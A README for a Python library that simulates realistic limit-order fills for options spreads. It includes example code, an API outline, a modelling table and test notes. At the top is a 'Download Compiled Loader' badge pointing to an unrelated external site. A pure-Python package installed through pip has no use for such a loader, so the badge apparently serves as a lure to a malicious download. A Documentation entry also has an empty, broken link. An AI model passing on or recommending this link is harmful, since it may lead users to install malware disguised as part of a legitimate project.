# flashalpha-fill-simulator

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Realistic limit-order fill simulator for options credit/debit spreads.

**Engine-agnostic. Data-source-agnostic. Zero runtime dependencies.**

Most options-credit-spread backtests fill at mid (or at bid/ask without queueing). Both lie. This library models what actually happens when you post a limit at MM-edge against a 1-min option chain (or any tick stream): you sit on the book until *someone else's* order crosses your price, with stale-quote guards, deterministic tiebreaking, and a patient-then-cross exit. It's the substrate, not a strategy.

```python
from datetime import date, datetime
from fillsim import simulate_fill, Spread, Leg, Config

# A vertical credit spread you've decided to post
spread = Spread(
    short=Leg(strike=440, bid=1.30, ask=1.30),
    long=Leg(strike=435, bid=0.86, ask=0.88),
    limit_credit=0.40,
    width=5.0,
    expiry=date(2026, 5, 15),
)

# The chain at the bar you're checking
chain_at_bar = {
    (date(2026, 5, 15), 440.0): (1.30, 1.30),
    (date(2026, 5, 15), 435.0): (0.86, 0.88),
}

bar = simulate_fill(
    bar_ts=datetime(2026, 4, 15, 10, 5),
    chain=chain_at_bar,
    candidates=[spread],
)
if bar.fill is not None:
    print(f"filled at {bar.fill.fill_price:.2f}, edge_captured={bar.fill.edge_captured:+.2f}")
else:
    print(f"no fill, near_misses={bar.near_misses}")
```

## Why this exists

Pick any "this strategy returned 5,000% in backtest" credit-spread post and check the fill model. It's almost always implicit mid-fills. Returns drop dramatically the moment you model:

- Post-and-wait limits (you don't fill until someone crosses your price)
- Stale-quote crosses (a one-tick blip in `bid` doesn't mean you'd really get filled)
- Random tiebreak when multiple candidates cross the same bar (any EV-aware tiebreak is a forward-looking oracle)
- Exit limits that don't walk down (your stop-loss has to actually fill at a real ask)

This library models all of those. None of the magic numbers are tuned to make a specific strategy look good — they were calibrated against the [`edge_captured`](docs/SPEC.md#diagnostics-emitted) distribution of an early permissive run, then frozen.

## Use it from anywhere

The headline API is a **per-bar primitive** — one stateless function that takes a bar's quotes and a list of open limit candidates, returns whether any fill happened on that bar:

```python
def simulate_fill(
    bar_ts: datetime,
    chain: dict[tuple[date, float], tuple[float, float]],   # (expiry, strike) → (bid, ask)
    candidates: list[Spread],
    config: Config = Config(),
) -> BarResult: ...
```

This makes the simulator embed in:

- **[QuantConnect](https://www.quantconnect.com/)** — call it from your `OnData` handler
- **[Backtrader](https://www.backtrader.com/)** — call it from `next()`
- **Live trading bots** — call it on each market-data update
- **Custom backtesters** — drop-in replacement for naive `if combo_mid <= limit:` fill logic
- **EOD strategies** — works the same way; the simulator doesn't assume any specific bar resolution

For offline backtests with all the data up-front, loop-driving convenience wrappers are also shipped. `right` defaults to `"PUT"` and can be set to `"CALL"` for call-spread chains:

```python
from fillsim import InMemoryChainProvider, simulate_fills

provider = InMemoryChainProvider(quotes=[...])
result = simulate_fills(posted_ts, candidates, provider, right="PUT")
if result.filled:
    print(f"filled in {result.bars_waited} bars; saw {result.near_misses} near-misses")
```

`CSVChainProvider` is available for tidy CSV exports with `ts`, `expiry`, `strike`, `right`, `bid`, and `ask` columns.

## Install

```bash
pip install flashalpha-fill-simulator
```

Zero runtime dependencies. Python 3.10+.

## What's modeled

| feature | configurable via |
|---|---|
| post-and-wait limit fills | `Config.fill_max_wait_bars` |
| stale-quote guard at fill | `Config.min_edge_floor` |
| epsilon over limit required to count as a fill | `Config.fill_epsilon` |
| relative-spread quote-quality filter | `Config.fill_max_rel_spread` |
| same-bar tiebreak (deterministic, EV-blind) | seeded by bar timestamp |
| multi-expiry candidate pools | per-candidate `expiry` field |
| patient exit (limit-then-market-out) | `Config.exit_mode = "patient"` |
| simpler exit modes (mid / ask) | `Config.exit_mode = "mid" \| "ask"` |
| exit wait window | `Config.exit_max_wait_bars` |
| at-expiry intrinsic settlement | `expiry_settlement_pnl(...)` |

## What's NOT modeled

These are intentional simplifications. See [docs/SPEC.md §7](docs/SPEC.md#7-what-the-simulator-does-not-model) for the full list.

- Queue position / size impact (works for retail/prop scale, breaks down at institutional size)
- Commissions / fees (caller subtracts them)
- Borrow/financing on cash collateral
- Early assignment risk
- Pin risk at expiry (linear interpolation only)
- Hard exchange halts

## Documentation

- **[docs/SPEC.md](docs/SPEC.md)** — full behavioural contract. Read this before relying on any number the simulator produces.
- **[docs/examples/](docs/examples/)** — runnable examples, no broker/data feed required.
- **[.md](.md)** — .

## Tests

```bash
pip install -e ".[test]"
pytest
```

50+ tests at v0.1.0; <1s wall time. CI enforces ruff, formatting, coverage, and type checks. The mandatory regression tests cover:

1. **EV-oracle**: same-bar tiebreak never reverts to EV/rank ordering
2. **Stale-quote**: invalid wide/crossed quotes cannot create fills
3. **Exit realism**: patient exit does not walk the limit down
4. **Boundary**: every threshold (`fill_epsilon`, `min_edge_floor`, `exit_max_wait_bars`) has a test asserting the correct boundary semantics

## Contributing

PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md). For behavioral changes, update `docs/SPEC.md` and add a synthetic-chain regression test.

Particularly wanted:

- Additional `ChainProvider` adapters (Polygon, Tradier, IBKR, dxFeed, ...)
- Property-based tests via Hypothesis
- A `quantconnect-fillsim` companion package showing how to wire it into a QC algorithm

## License

MIT. See [LICENSE](LICENSE).

## Provenance

Extracted from [FlashAlpha](https://flashalpha.com)'s internal SPY VRP-harvest backtester. The simulator was built specifically because every off-the-shelf options backtest framework we evaluated assumed mid-fills, and our strategy returns flipped from "+5,400%" to "ambiguous" the moment we modeled execution honestly. Open-sourcing the substrate so others don't have to relearn that lesson the hard way.
